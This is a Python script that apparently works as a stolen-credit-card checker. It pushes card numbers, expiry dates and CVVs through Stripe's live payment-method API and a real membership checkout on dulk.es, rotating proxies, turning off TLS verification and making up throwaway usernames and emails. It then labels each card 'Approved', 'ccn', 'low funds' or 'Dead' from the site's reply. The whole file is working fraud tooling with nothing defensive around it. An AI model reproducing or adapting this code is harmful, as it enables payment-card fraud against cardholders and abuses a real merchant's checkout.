from utilsdf.functions import random_proxy, capture, random_email, random_word, clean_text
from httpx import AsyncClient


async def piccolo(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False, proxies=random_proxy()
    ) as session:
        n = random_word(8)
        mail = random_email()

        r = await session.get(
            "https://www.dulk.es/workshops/membership-account/membership-checkout/"
        )

        h2 = {
            "Host": "api.stripe.com",
            "content-type": "application/x-www-form-urlencoded",
        }

        p2 = f"type=card&billing_details[address][line1]=118+W+132nd+St&billing_details[address][line2]=&billing_details[address][city]=New+York&billing_details[address][state]=New+York&billing_details[address][postal_code]=10027&billing_details[address][country]=US&billing_details[name]=Sachio+Yt&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5816dc8686%3B+stripe-js-v3%2F5816dc8686%3B+split-card-element&referrer=https%3A%2F%2Fwww.dulk.es&time_on_page=54204&key=pk_live_Z11r5j38NcCzz2tketw02IK9"

        r2 = await session.post(
            "https://api.stripe.com/v1/payment_methods", headers=h2, data=p2
        )
        t2 = r2.text
        pm = capture(t2, '"id": "', '"')
        l4 = capture(t2, '"last4": "', '"')
        fu = capture(t2, '"funding": "', '"')

        h3 = {
            "Host": "www.dulk.es",
            "origin": "https://www.dulk.es",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.dulk.es/workshops/membership-account/membership-checkout/",
        }

        p3 = f"level=1&checkjavascript=1&other_discount_code=&username={n}&password=*{n}*&password2=*{n}*&bemail={mail}&bconfirmemail={mail}&fullname=&bfirstname={n}&blastname={n}{n}&baddress1=118+W+132nd+St&baddress2=&bcity=New+York&bstate=New+York&bzipcode=10027&bcountry=US&bphone=19006318646&CardType=visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&payment_method_id={pm}&AccountNumber=XXXXXXXXXXXX{l4}&ExpirationMonth={month}&ExpirationYear={year}"

        r3 = await session.post(
            "https://www.dulk.es/workshops/membership-account/membership-checkout/",
            headers=h3,
            data=p3,
        )
        t3 = r3.text
        msg2 = capture(t3, '"pmpro_message pmpro_error">\n', "\n</div>")
        msg2 = clean_text(msg2)
        msg = capture(msg2, "", " Membership Level")

        if r3.status_code == 302:
            status = "Aproved! ✅ -» charged!"
            msg = "Success! -» $0"
        elif "security code is incorrect" in msg:
            status = "Approved! ✅ -» ccn"
        elif "funds" in msg:
            status = "Approved! ✅ -» low funds"
        else:
            status = "Dead! ❌"

        return status, msg
